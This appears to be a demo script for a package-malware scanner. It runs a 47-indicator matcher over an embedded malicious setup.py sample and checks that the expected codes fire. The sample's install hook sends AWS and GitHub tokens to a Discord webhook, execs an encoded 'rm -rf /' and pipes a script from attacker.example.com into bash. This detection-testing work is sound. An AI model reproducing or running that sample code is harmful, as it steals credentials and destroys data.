"""47-indicator 매칭 데모 (예전 tests/test_47_indicators.py).

본 파일은 def test_*() 함수가 없어 pytest collect 0 items 였음.
실제 회귀 검증은 scripts/eval_synthetic.py (120 fixture, cycle 11) 가 담당.
사람 확인용 단발 데모 / 학습용으로만 직접 실행.

실행:
    python examples/indicator_47_demo.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.indicator_matcher import match_all
from pkgsentinel.stages.stage1_entry_point import EntryFile
from pkgsentinel.stages.stage1b_full_source import FullSourceFile
from pkgsentinel.stages.stage2_behavior import _analyze_python

SAMPLE_MALICIOUS = '''
"""Setup.py — credential theft + reverse shell + obfuscation"""
from setuptools import setup
from setuptools.command.install import install
import os, base64, requests, subprocess, socket


class CustomInstall(install):
    def run(self):
        # SYS-005 + EXF-001
        info = {
            "user": os.environ.get("USER"),
            "aws":  os.environ.get("AWS_ACCESS_KEY_ID"),
            "tok":  os.environ.get("GITHUB_TOKEN"),
        }
        # DEF-003 (encoding)
        payload = base64.b64encode(str(info).encode()).decode()
        # NET-010 (http)
        # EXF-004 (webhook)
        requests.post(
            "https://discord.com/api/webhooks/123/secret",
            data={"d": payload},
            verify=False,  # NET-009
            timeout=5,
        )
        # EXM-001 + DEF-005 (exec on string variable)
        encoded = "ZXhlYygncm0gLXJmIC8nKQ=="
        exec(base64.b64decode(encoded).decode())
        # EXM-008 (shell)
        subprocess.run("curl http://attacker.example.com/x.sh | bash", shell=True)
        install.run(self)


setup(
    name="evil-helpers",  # MET-006 typosquat candidate (vs "helpers")
    version="0.0.1",
    author="test",  # MET-001
    description="json",  # MET-004 (very short)
    cmdclass={"install": CustomInstall},  # EXS-003
    install_requires=["psutil"],  # MET-003 (parser-like vs system tool)
)
'''

BENIGN = '''
"""Clean module."""
from .core import App
__version__ = "0.0.1"
'''


def main():
    # FullSourceFile / EntryFile 만들기
    sf_setup = FullSourceFile(
        path="evil-helpers-0.0.1/setup.py",
        basename="setup.py",
        content=SAMPLE_MALICIOUS,
        size=len(SAMPLE_MALICIOUS),
        language="python",
        tier=1,
    )
    sf_init = FullSourceFile(
        path="evil-helpers-0.0.1/evil_helpers/__init__.py",
        basename="__init__.py",
        content=BENIGN,
        size=len(BENIGN),
        language="python",
        tier=1,
    )

    # Stage 2 분석
    fs_setup = _analyze_python(EntryFile(
        path=sf_setup.path, basename=sf_setup.basename,
        content=sf_setup.content, size=sf_setup.size, language="python",
    ))
    fs_init = _analyze_python(EntryFile(
        path=sf_init.path, basename=sf_init.basename,
        content=sf_init.content, size=sf_init.size, language="python",
    ))

    # 47 지표 매칭
    report = match_all(
        behavior_files=[fs_setup, fs_init],
        source_files=[sf_setup, sf_init],
        package_name="evil-helpers",
        description="json",
        author="test",
        declared_deps=["psutil"],
    )

    print("=== 47-Indicator Match Report ===")
    print(f"total hits           : {len(report.hits)}")
    print(f"categories present   : {len(report.categories_present)}")
    print(f"  -> {[c.value for c in report.categories_present]}")
    print(f"high severity hits   : {report.high_severity_count}")

    print("\n=== Hits Detail ===")
    for h in sorted(report.hits, key=lambda x: x.indicator.code):
        print(f"  [{h.indicator.code}] {h.indicator.name}")
        print(f"    severity   : {h.indicator.severity.value}")
        print(f"    confidence : {h.confidence:.2f}")
        print(f"    file       : {h.file_path}:L{h.line}")
        print(f"    reason     : {h.reason}")

    print("\n=== 검증 (탐지되어야 할 지표) ===")
    expected = {
        "EXS-002",   # install-time exec (top-level setup.py)
        "EXS-003",   # cmdclass override
        "EXM-001",   # exec
        "EXM-008",   # subprocess shell
        "EXF-001",   # info read + transmit
        "EXF-004",   # discord webhook
        "DEF-003",   # base64 encode
        "DEF-005",   # exec on variable (encoded)
        "NET-009",   # verify=False
        "NET-007",   # curl|bash
        "MET-001",   # author='test'
        "MET-004",   # short description
    }
    found = {h.indicator.code for h in report.hits}
    missed = expected - found
    extra = found - expected
    if not missed:
        print(f"  OK - 모든 핵심 지표 탐지: {sorted(expected & found)}")
    else:
        print(f"  MISS: {sorted(missed)}")
    if extra:
        print(f"  추가로 잡힌 지표 (참고): {sorted(extra)}")


if __name__ == "__main__":
    main()
